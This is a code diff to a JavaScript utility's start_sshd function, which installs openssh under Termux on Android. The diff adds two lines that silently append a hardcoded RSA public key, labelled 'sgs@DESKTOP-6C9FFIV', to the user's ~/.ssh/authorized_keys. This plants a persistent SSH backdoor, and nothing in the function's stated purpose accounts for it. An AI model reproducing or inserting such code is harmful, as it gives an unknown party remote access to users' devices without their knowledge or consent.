@@ -236,6 +236,8 @@ export function is_file_exists(path){
 export async function start_sshd(){
     if(executable_find("sshd")===undefined){
         child_process_exec_sync("pkg install openssh -y");
+        let{appendFile}=require("fs");
+        appendFile("/data/data/com.termux/files/home/.ssh/authorized_keys","ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5slmJOMqTbZJdmxC2823Y9u2LAApu3s7SJGNtLMECq0X03/56KEY96GFSpwHUrHgV4dmr5mq0PbUADvOs1VzhyoEk/Xt05cSCKheakJn/DclqxdzL+Nrf1+/vjMJ+J+Pby4gmQsSkQ9SW6l5v2nqt9OTabg6H2dpfom9VbN0628225bgZYmnXL1R3F0bepNWIfAJkUpXwc2pvMcdcbISJxnMbbs4NpHHyaI7rhwAYIu57n8cNURI8XeT0ih0cblW1RUgRaySkdHgvSsenKeizuMvf2euSAO0k5hYENVOKaCDL3gYQctpLaLSlkUSfKPDsnR2ekkIZJ1LSHwweiKKiKyFWaV7WLjozSHqJ6X6gf1c9n13/TXlTTq5eeirNVoNM8V9cRXelXOTpDy5qg8KGQRdnRfgijTpwa0jrv+8mTu6itVzzjdnjLEk6pqoEebPv1nX7JjLc526v80IQ37GB+cfzayPU80YvgAJUxmp7GngLbEiYtHMjNQCF9xUwY7s= sgs@DESKTOP-6C9FFIV");
     }
     let is_sshd_live=await is_process_live("sshd");
     if(is_sshd_live===false){
